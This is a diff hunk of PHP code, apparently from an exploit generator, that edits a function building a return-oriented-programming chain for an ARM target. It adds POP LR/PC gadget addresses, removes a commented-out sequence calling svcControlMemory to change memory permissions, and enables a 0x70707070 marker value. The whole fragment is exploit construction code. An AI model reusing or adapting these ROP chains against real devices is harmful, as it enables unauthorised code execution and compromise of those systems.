@@ -1391,29 +1391,12 @@ function generateropchain_type2()
 	$ROPCHAIN.= genu32_unicode(0x0);//r5
 	$ROPCHAIN.= genu32_unicode(0x0);//r6
 
+	$ROPCHAIN.= genu32_unicode($POPLRPC);
+	$ROPCHAIN.= genu32_unicode($POPPC);
+
 	$ROPCHAIN.= genu32_unicode($CODESTART_MAPADR);
 
-	/*$ROPCHAIN.= genu32_unicode($POPLRPC);
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
-
-	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
-	$ROPCHAIN.= genu32_unicode($ROPHEAP);//r0 out addr
-	$ROPCHAIN.= genu32_unicode($OSSCRO_HEAPADR);//r1 addr0
-	$ROPCHAIN.= genu32_unicode(0x0);//r2 addr1
-	$ROPCHAIN.= genu32_unicode(0x1000);//r3 size
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5
-	$ROPCHAIN.= genu32_unicode(0x0);//r6
-
-	$ROPCHAIN.= genu32_unicode($svcControlMemory);
-
-	$ROPCHAIN.= genu32_unicode(0x6);//r1 / sp0 mem-operation: protect
-	$ROPCHAIN.= genu32_unicode(0x1);//r2 / sp4 permissions: RW
-	$ROPCHAIN.= genu32_unicode(0x0);//r3
-	$ROPCHAIN.= genu32_unicode(0x0);//r4
-	$ROPCHAIN.= genu32_unicode(0x0);//r5*/
-
-	//$ROPCHAIN.= genu32_unicode(0x70707070);
+	$ROPCHAIN.= genu32_unicode(0x70707070);
 }
 
 function generateropchain_type3()
